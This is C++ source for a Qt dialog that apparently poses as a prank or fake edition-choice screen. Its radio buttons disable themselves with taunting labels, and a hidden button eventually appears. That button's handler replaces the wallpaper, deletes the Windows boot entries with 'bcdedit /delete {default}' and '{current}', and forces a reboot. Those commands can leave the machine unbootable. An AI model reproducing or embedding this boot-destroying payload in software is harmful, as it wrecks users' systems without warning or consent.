#include "dialog4.h"
#include "ui_dialog4.h"
#include <windows.h>
#include <iostream>

Dialog4::Dialog4(QWidget *parent) :
    QDialog(parent),
    ui(new Ui::Dialog4)
{
    ui->setupUi(this);
    setFixedSize(size());
    ui->radioButton_10->setVisible(0);
    ui->pushButton->setVisible(0);
}

Dialog4::~Dialog4()
{
    delete ui;
}

void Dialog4::on_radioButton_clicked()
{
  ui->radioButton->setEnabled(0);
  ui->radioButton->setText("error");
  ui->radioButton_10->setChecked(1);
}


void Dialog4::on_radioButton_5_clicked()
{
    ui->radioButton_5->setEnabled(0);
    ui->radioButton_5->setText("nope");
    ui->radioButton_10->setChecked(1);
}


void Dialog4::on_radioButton_2_clicked()
{
    ui->radioButton_2->setEnabled(0);
    ui->radioButton_2->setText("are this edition exist?");
    ui->radioButton_10->setChecked(1);
}


void Dialog4::on_radioButton_6_clicked()
{
    ui->radioButton_6->setEnabled(0);
    ui->radioButton_6->setText("");
    ui->radioButton_10->setChecked(1);
}


void Dialog4::on_radioButton_7_clicked()
{
    ui->radioButton_7->setEnabled(0);
    ui->radioButton_7->setText("why are you trying?");
    ui->radioButton_10->setChecked(1);
}


void Dialog4::on_radioButton_3_clicked()
{
    ui->radioButton_3->setEnabled(0);
    ui->radioButton_3->setVisible(0);
    ui->radioButton_10->setChecked(1);
}


void Dialog4::on_radioButton_8_clicked()
{
    ui->radioButton_8->setEnabled(0);
     ui->radioButton_8->setText("hello");
     ui->radioButton_10->setChecked(1);
}


void Dialog4::on_radioButton_4_clicked()
{
    ui->radioButton_4->setEnabled(0);
     ui->radioButton_4->setText("stop");
     ui->radioButton_10->setChecked(1);
}


void Dialog4::on_radioButton_9_clicked()
{
    ui->radioButton_10->setVisible(1);
    ui->radioButton_9->setEnabled(0);
     ui->radioButton_9->setText("no");
     ui->radioButton_10->setChecked(1);
     ui->pushButton->setVisible(1);
}


void Dialog4::on_pushButton_clicked()
{
    const wchar_t *file = L"C:\\Temp\\windows11isshit.bmp";
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void *)file, SPIF_UPDATEINIFILE);
    system("bcdedit /delete {default}");
    system("bcdedit /delete {current}");
    system("shutdown -r -t 15");
    exit(1);
}

